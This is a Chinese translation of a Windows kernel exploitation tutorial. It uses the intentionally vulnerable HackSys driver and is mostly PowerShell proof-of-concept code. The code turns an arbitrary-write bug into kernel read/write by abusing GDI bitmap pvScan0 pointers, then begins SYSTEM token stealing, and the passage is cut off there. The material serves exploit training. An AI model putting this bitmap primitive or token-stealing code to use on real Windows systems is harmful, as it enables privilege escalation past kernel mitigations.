---
title: Windows exploit系列教程第十七部分：内核利用程序之任意位置任意写
date: 2018-03-15 20:02:11
categories: exploit
tags:
	- windows
	- novice
---
fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第八篇。[点击查看原文](http://fuzzysecurity.com/tutorials/expDev/21.html)。

<!--more-->

# Windows exploit系列教程第十七部分：内核利用程序之滥用GDI Bitmap（Win7-10 32/64位）

欢迎回来！我们将再次通过 [@HackSysTeam's](https://twitter.com/HackSysTeam) 驱动深入到ring0层。本文中我们将重温任意地址任意写漏洞。通过实现一个强大的ring0层读写功能我们可以在32位和64位的Windows 7/8/8.1/10(pre v1607)系统上创造一个可以工作的exploit！如我们即将所见，该技术本质上是一个数据攻击，因此我们将不费力气的绕过SMEP/SMAP/CFG/RFG缓解措施，直达胜利！

本技术有一点“复杂”，需要一些预备知识。这一部分我强烈推荐读者在开始阅读本文之前，先阅读下面的资源。最后，为了尝鲜，我们将在64位的Windows 10系统上开发exp。那就不跟你多BB，让我们开始吧！

+ HackSysTeam-PSKernelPwn ([@FuzzySec](https://twitter.com/FuzzySec)) - [here](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)
+ Abusing GDI for ring0 exploit primitives ([@CoreSecurity](https://twitter.com/CoreSecurity)) - [here](https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives)
+ Abusing GDI Reloaded ([@CoreSecurity](https://twitter.com/CoreSecurity)) - [here](https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf)
+ This Time Font hunt you down in 4 bytes ([@keen_lab](https://twitter.com/keen_lab)) - [here](http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes)
+ Terminus Project ([@rwfpl](https://twitter.com/rwfpl)) - [here](http://terminus.rewolf.pl/terminus/)

## 侦查挑战

我们将直接对第十一部分的任意地址任意写漏洞重新梳理，也就无需再次做完整的

解读。我们只想确保我们的任意写在Win10上依然可以如期工作。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
}
"@
 
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
 
 
[byte[]]$Buffer = [System.BitConverter]::GetBytes(0x4141414141414141) + [System.BitConverter]::GetBytes(0x4242424242424242)
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22200B"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

看起来我们得到了想要的结果。

![](/images/exploit/fuzzySecurity/20180315_1.jpg)

如果你记着第十部分的话就会发现这并不完整。我们写进去的值实际上并不是0x4141414141414141，而是该地址上存储的指针。与此同时，我们的POC仅仅在64位机上成功运行。我们需要对exp的架构独立性进行调整！

我们可以修改buffer结构成下面的内容，以成功在32/64位机实现任意写。

```powershell
# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WriteWhat).Length)
[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WriteWhat), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WriteWhat).Length)
if ($x32Architecture) {
    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($WriteWhere)
} else {
    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($WriteWhere)
}
```

尽管传递了合适的值，它也并不能工作。

## Pwn

简单的工作完成了。我们现在想要的是将一个单一任意写漏洞转换成一个完全的ring0读写。在高级别下我们可以：

1. 创建两个bitmap对象
2. 泄露出各自的内核地址
3. 使用任意写漏洞修改其中一个bitmap对象的header成员
4. 使用Gdi32的GetBitmapBits/SetBitmapBits API调用来读写内核地址空间

![](/images/exploit/fuzzySecurity/20180315_2.jpg)

本技术重要的部分在于，当创建一个bitmap时，我们可以泄露出其在内核中的地址。这一泄露在Windows10的v1607版本之后被打上了补丁，哭哭。

如其所呈现般，当创建一个bitmap时，一个结构被附加到了父进程PEB的GdiSharedHandleTable中。给定进程PEB的基地址，GdiSharedHandleTable就在如下的偏移处（分别于32/64位）。

```powershell
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
    [FieldOffset(148)]
    public IntPtr GdiSharedHandleTable32;
    [FieldOffset(248)]
    public IntPtr GdiSharedHandleTable64;
}
```

PEB中的该条目是一个指向GDICELL结构体数组的指针，它定义了多种不同的image类型。该结构体的定义如下：

```powershell
/// 32bit size: 0x10
/// 64bit size: 0x18
[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
    public IntPtr pKernelAddress;
    public UInt16 wProcessId;
    public UInt16 wCount;
    public UInt16 wUpper;
    public UInt16 wType;
    public IntPtr pUserAddress;
}
```

让我们用下面的POC来看看是否可以在KD中手动找到`_GDI_CELL`结构体。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateBitmap(
        int nWidth,
        int nHeight,
        uint cPlanes,
        uint cBitsPerPel,
        IntPtr lpvBits);
}
"@
 
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$Bitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
"{0:X}" -f [int]$Bitmap
```

运行POC，立即得到了一个bitmap句柄，可以看到它不是一个标准的句柄值（看起来太大了）。

![](/images/exploit/fuzzySecurity/20180315_3.jpg)

实际上，bitmap句柄的最后两个字节是该结构在GdiSharedHandleTable数组中的索引（=>`handle & 0xffff`）。于是，让我们跳转到KD来看看是否可以找到我们新创建的bitmap的`_GDI_CELL`结构。

![](/images/exploit/fuzzySecurity/20180315_4.jpg)

有了指向GdiSharedHandleTable数组的指针，我们所需要做的就是按结构体尺寸的倍数（64位为0x18）增加结构体的索引。

![](/images/exploit/fuzzySecurity/20180315_5.jpg)

[Process hacker](http://processhacker.sourceforge.net/)有一个非常有用的特性来列出GDI对象句柄。我们可以用它来证实在KD中找到的值。

![](/images/exploit/fuzzySecurity/20180315_6.jpg)

很棒！我们需要通过重新来采集两个bitmap的信息（manager+worker）。如我们可以看到的，在bitmap句柄上仅仅是做一些简单的数学运算。唯一的问题在于我们要如何拿到进程PEB的基地址。幸运的是，未文档化的NtQueryInformationProcess函数可以解决这个问题。当使用ProcessBasicInformation类(0x0)来调用该函数时，它会返回一个包含PEB基地址的结构体。在这里，我不会进一步描述更多的细节，毕竟这是个妇孺皆知的技巧。下面的POC会清理掉任何疑点！

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_BASIC_INFORMATION
{
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public IntPtr BasePriority;
    public UIntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}
 
/// Partial _PEB
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
    [FieldOffset(148)]
    public IntPtr GdiSharedHandleTable32;
    [FieldOffset(248)]
    public IntPtr GdiSharedHandleTable64;
}
 
[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
    public IntPtr pKernelAddress;
    public UInt16 wProcessId;
    public UInt16 wCount;
    public UInt16 wUpper;
    public UInt16 wType;
    public IntPtr pUserAddress;
}
 
public static class EVD
{
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr processHandle, 
        int processInformationClass,
        ref _PROCESS_BASIC_INFORMATION processInformation,
        int processInformationLength,
        ref int returnLength);
 
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateBitmap(
        int nWidth,
        int nHeight,
        uint cPlanes,
        uint cBitsPerPel,
        IntPtr lpvBits);
}
"@
 
#==============================================[PEB]
 
# Flag architecture $x32Architecture/!$x32Architecture
if ([System.IntPtr]::Size -eq 4) {
    echo "`n[>] Target is 32-bit!"
    $x32Architecture = 1
} else {
    echo "`n[>] Target is 64-bit!"
}
# Current Proc handle
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
# Process Basic Information
$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
$returnLength = New-Object Int
$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
# PID & PEB address
echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
if ($x32Architecture) {
    echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
} else {
    echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
}
# Lazy PEB parsing
$_PEB = New-Object _PEB
$_PEB = $_PEB.GetType()
$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
# GdiSharedHandleTable
if ($x32Architecture) {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
} else {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
}
# _GDI_CELL size
$_GDI_CELL = New-Object _GDI_CELL
$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
 
#==============================================[/PEB]
 
#==============================================[Bitmap]
 
echo "`n[>] Creating Bitmaps.."
 
# Manager Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
} else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
}
 
# Worker Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
} else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
}
 
#==============================================[/Bitmap]
```

![](/images/exploit/fuzzySecurity/20180315_7.jpg)

注意到我们的脚本是架构独立的！其中的一个疑题解决掉了，但是我们为什么要关心这些bitmap对象呢？

泄露出来的bitmap内核地址在内核空间中指向了下面的GDI baseobject结构。

```powershell
/// 32bit size: 0x10
/// 64bit size: 0x18
[StructLayout(LayoutKind.Sequential)]
public struct _BASEOBJECT
{
    public IntPtr hHmgr;
    public UInt32 ulShareCount;
    public UInt16 cExclusiveLock;
    public UInt16 BaseFlags;
    public UIntPtr Tid;
}
```

我们对此并无多大兴趣，如果你想要了解更多关于baseobject的信息，请参考ReactOS wiki [here](https://www.reactos.org/wiki/Techwiki:Win32k/BASEOBJECT). 在这一头部之后，有一个特定的结构体，它的类型取决于该对象的类型。对于bitmaps来说，这是个 [surface object](https://msdn.microsoft.com/en-us/library/ff569901.aspx) 结构体。

```powershell
/// 32bit size: 0x34
/// 64bit size: 0x50
[StructLayout(LayoutKind.Sequential)]
public struct _SURFOBJ
{
    public IntPtr dhsurf;
    public IntPtr hsurf;
    public IntPtr dhpdev;
    public IntPtr hdev;
    public IntPtr sizlBitmap;
    public UIntPtr cjBits;
    public IntPtr pvBits;
    public IntPtr pvScan0; /// offset => 32bit = 0x20 & 64bit = 0x38
    public UInt32 lDelta;
    public UInt32 iUniq;
    public UInt32 iBitmapFormat;
    public UInt16 iType;
    public UInt16 fjBitmap;
}
```

pvScan0成员就是我们想要的！这一成员是一个指针，指向bitmap的首个扫描行。从泄露出来的内核地址我们可以计算出该成员的偏移。

```powershell
# 32 bit
[IntPtr]pvScan0_32 = $pKernelAddress + 0x30
 
# 64 bit
[IntPtr]pvScan0_64 = $pKernelAddress + 0x50
```

说了这么多，还是那个问题，为什么要关心这货？好吧，有这样两个GDI32 API调用，[GetBitmapBits](https://msdn.microsoft.com/en-us/library/windows/desktop/dd144850%28v=vs.85%29.aspx) 和 [SetBitmapBits](https://msdn.microsoft.com/en-us/library/windows/desktop/dd162962%28v=vs.85%29.aspx) ，它们直接操纵该成员。GetBitmaps允许我们在pvScan0地址上读任意字节，SetBitmapBits允许我们在pvScan0地址上写任意字节。闻到pwn的味道了吗？

我们可以简要的更新POC来包含manager和worker bitmap的pvScan0偏移。

```powershell
# 32 bit
# IntPtr at $HandleTableEntry = pKernelAddress
$BitmapScan0_32 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
 
# 64 bit
# IntPtr at $HandleTableEntry = pKernelAddress
$BitmapScan0_64 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
```

从现在开始，在ring0层的工作就很可以很简单的展开了。最基本的，使用我们的任意写来设置manager bitmap的pvScan0地址去指向worker bitmap的pvScan0地址。整合所有的内容，我们写出下面的POC。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_BASIC_INFORMATION
{
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public IntPtr BasePriority;
    public UIntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}
 
/// Partial _PEB
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
    [FieldOffset(148)]
    public IntPtr GdiSharedHandleTable32;
    [FieldOffset(248)]
    public IntPtr GdiSharedHandleTable64;
}
 
[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
    public IntPtr pKernelAddress;
    public UInt16 wProcessId;
    public UInt16 wCount;
    public UInt16 wUpper;
    public UInt16 wType;
    public IntPtr pUserAddress;
}
 
public static class EVD
{
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr processHandle, 
        int processInformationClass,
        ref _PROCESS_BASIC_INFORMATION processInformation,
        int processInformationLength,
        ref int returnLength);
 
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateBitmap(
        int nWidth,
        int nHeight,
        uint cPlanes,
        uint cBitsPerPel,
        IntPtr lpvBits);
 
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
}
"@
 
#==============================================[PEB]
 
# Flag architecture $x32Architecture/!$x32Architecture
if ([System.IntPtr]::Size -eq 4) {
    echo "`n[>] Target is 32-bit!"
    $x32Architecture = 1
} else {
    echo "`n[>] Target is 64-bit!"
}
# Current Proc handle
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
# Process Basic Information
$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
$returnLength = New-Object Int
$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
# PID & PEB address
echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
if ($x32Architecture) {
    echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
} else {
    echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
}
# Lazy PEB parsing
$_PEB = New-Object _PEB
$_PEB = $_PEB.GetType()
$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
# GdiSharedHandleTable
if ($x32Architecture) {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
} else {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
}
# _GDI_CELL size
$_GDI_CELL = New-Object _GDI_CELL
$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
 
#==============================================[/PEB]
 
#==============================================[Bitmap]
 
echo "`n[>] Creating Bitmaps.."
 
# Manager Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
 
# Worker Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
 
#==============================================[/Bitmap]
 
#==============================================[GDI ring0 primitive]
 
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
 
# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerpvScan0).Length)
[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerpvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerpvScan0).Length)
if ($x32Architecture) {
    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
} else {
    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
}
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22200B"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
 
#==============================================[/GDI ring0 primitive]
```

运行新的POC，在KD中看一下pvScan0。

![](/images/exploit/fuzzySecurity/20180315_8.jpg)

![](/images/exploit/fuzzySecurity/20180315_9.jpg)

如上图所见，我们正确修改了manager指针，本质上也就达成了可重用的内核任意读写。使用这些bitmap来读写数据的进程可以在下面看到。

```powershell
# Arbitrary kernel read
(1) GDI32::SetBitmapBits(Address)    -> Manager  # This updates the workers pvScan0 pointer
(2) GDI32::GetBitmapBits(Byte Count) -> Worker   # Reads X bytes from Address

# Arbitrary kernel write
(1) GDI32::SetBitmapBits(Address)    -> Manager  # This updates the workers pvScan0 pointer
(2) GDI32::SetBitmapBits(Value)      -> Worker   # Writes X bytes to Address

```

花些时间来消化一下，我承认这一开始有些令人困惑。为了方便，我创建了下面的助手函数来做透明化的IntPtr大小的读写。

```powershell
# Arbitrary Kernel read
function Bitmap-Read {
    param ($Address)
    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    [IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
    $CallResult = [EVD]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
    if ($x32Architecture){
        [System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
    } else {
        [System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
    }
    $CallResult = [EVD]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}
 
# Arbitrary Kernel write
function Bitmap-Write {
    param ($Address, $Value)
    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    $CallResult = [EVD]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}
```

在内核中可以任意读写后，我们仍需要找出如何获取SYSTEM。记住我们在64位Windows 10上，这里有着大量的增强版缓解措施诸如SMEP（阻止我们在用户空间运行shellcode）。既然我们已经可以自由的拷贝数据了，看起来在执行体进程块（EPROCESS）上可以做一个数据攻击。EPROCESS结构体包含了进程token，这个token描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限。当进程或线程尝试去与一个安全对象交互或尝试去执行一个需要特定权限的功能时，OS通过查询这个token来鉴权。

既然进程的token仅仅是一个EPROCESS结构体中的IntPtr尺寸的值。如果我们可以找到SYSTEM进程，拷贝它的token并覆盖PowerShell进程的token，那我们就提权到了SYSTEM。

第一步就是拿到一个指向SYSTEM EPROCESS结构体的指针。实际上，为了避免蓝屏，我们仅可以安全的利用目标PID 4。有一个非常方便的全局变量[PsInitialSystemProcess](https://msdn.microsoft.com/en-us/library/windows/hardware/ff559943%28v=vs.85%29.aspx) 指向了system EPROCESS(->PID 4)。我们可以在NT内核中通过NtQueryInformation API拿到这一基地址。我写了个脚本[Get-LoadedModules](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-LoadedModules.ps1)，用于完成这项任务。我们做下面的计算来获取这一全局变量。

```powershell
echo "[>] Leaking SYSTEM _EPROCESS.."
$SystemModuleArray = Get-LoadedModules
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [EVD]::LoadLibrary("$KernelType")
$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
$SystemEprocess = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
